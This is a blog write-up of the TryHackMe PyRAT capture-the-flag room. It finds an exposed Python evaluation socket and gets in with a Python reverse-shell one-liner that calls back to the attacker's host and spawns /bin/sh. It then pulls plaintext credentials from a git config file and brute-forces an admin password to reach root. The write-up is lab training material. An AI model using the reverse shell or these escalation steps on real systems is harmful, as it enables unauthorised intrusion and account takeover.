---
layout: post
title: "PyRAT Write Up"
description: "A complete walkthrough for the PyRAT CTF room on TryHackMe: discovering a custom TCP Python socket interpreter, popping an initial reverse shell, enumerating git repository configuration for credentials, and abusing an admin prompt to crack root."
tags: [CTF, TryHackMe, PyRAT, Python Security, Reverse Shell, Privilege Escalation, Git, Linux]
category: security
image: https://nirusaki.me/assets/img/og/home.png
---

### Welcome to PyRAT

Welcome back hackers! Today we are tackling **PyRAT**, a super fun TryHackMe machine that features a custom Python socket server running exposed on the network, git repository credential leaks, and an admin password brute-force escalation.

Let's jump right into the terminal and own this box!

---

### 1. Reconnaissance & Service Discovery

We start by running an Nmap scan against our target IP (`10.48.171.190`):

```bash
nmap -sV 10.48.171.190
```

![Nmap Scan Result](/assets/img/posts/image_1786648644260_0.png)

Nmap scan results show two open ports:
* **Port 22 (SSH)**: OpenSSH service.
* **Port 8000 (HTTP/Custom)**: Service listed as HTTP/PyRAT server.

Let's try sending an HTTP request using `curl`:

```bash
curl http://10.48.171.190:8000/
```

![Curl Response](/assets/img/posts/image_1786648666112_0.png)

The server responds with a message hinting that standard HTTP requests are not expected, and suggesting a more basic TCP connection instead.

Let's test this intuition by connecting directly using Netcat on port 8000:

```bash
nc 10.48.171.190 8000
```

![Netcat Connection](/assets/img/posts/image_1786648737513_0.png)

When we try typing standard HTTP methods like `GET /`, the server returns an error stating that `GET` is not defined!

![GET Error in Python Environment](/assets/img/posts/image_1786648839923_0.png)

That is a huge clue: port 8000 is not running a web server at all. It is running an interactive raw Python socket server that evaluates raw Python code directly!

![Wait it's Python](/assets/img/posts/pyrat-python-hack.gif)

---

### 2. Popping Initial Access

Since port 8000 evaluates Python code line by line, we can feed it a Python socket reverse shell one-liner!

First, start a Netcat listener on our machine:

```bash
nc -lvnp 4444
```

Next, paste this Python reverse shell payload directly into the open Netcat session on port 8000:

```python
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.189.240",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
```

Boom! Check your listener: shell popped!

Let's immediately stabilize our shell TTY environment:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Now we have a clean interactive shell on the box.

![Shell Popped Hackerman](/assets/img/posts/pyrat-shell-popped.gif)

---

### 3. Privilege Escalation to User `think`

Now we need to escalate privileges to user `think`. Let's search the file system for files and directories owned by user `think`.

Looking around `/opt`, we discover an unusual directory: `/opt/dev`!

![Opt Dev Directory](/assets/img/posts/image_1786680059301_0.png)

Navigating to `/opt/dev`, we notice a `.git` repository folder present.

![Git Repository Inspection](/assets/img/posts/image_1786680096875_0.png)

Let's inspect the git configuration file by reading `.git/config`:

```bash
cat /opt/dev/.git/config
```

![Git Config Credentials](/assets/img/posts/image_1786680152081_0.png)

Holy shit! The git configuration file exposes hardcoded user credentials left behind by the developer:

* **Username**: `think`
* **Password**: `_TH1NKINGPirate$_`

![Git Config Credentials Found](/assets/img/posts/pyrat-git-creds.gif)

Let's switch user to `think`:

```bash
su think
# Password: _TH1NKINGPirate$_
whoami
# Output: think
```

![Su Think User Flag](/assets/img/posts/image_1786680195081_0.png)

User 1 flag retrieved!

---

### 4. Root Escalation via Admin Prompt & Password Brute Force

Now it's time for ROOT!

When inspecting old code files like `pyrat.old.py` left on the system, we discover that the custom Python server includes an administrative mode. Typing the string `admin` into the socket connection prompts the user for an admin password.

We can run a password brute force against the `admin` prompt using the classic `rockyou.txt` wordlist.

Running the brute force attack yields the admin password: **`abc123`**.

![Admin Brute Force Root Flag](/assets/img/posts/image_1786683198322_0.png)

Connecting back to port 8000 (or invoking the admin handler), we enter:

```text
admin
# Password: abc123
```

The server authenticates us and grants direct Root shell access!

```bash
whoami
# Output: root
cat /root/root.txt
```

Root flag secured!

![Root Victory](/assets/img/posts/pyrat-root-victory.gif)

---

### Key Takeaways

1. Never expose raw code evaluation endpoints (like interactive Python sockets) to public or unauthenticated network ports.
2. Never commit sensitive credentials or passwords into `.git/config` or development repositories.
3. Avoid weak, easily guessable administrative passwords like `abc123`.

Until next time, keep hacking!
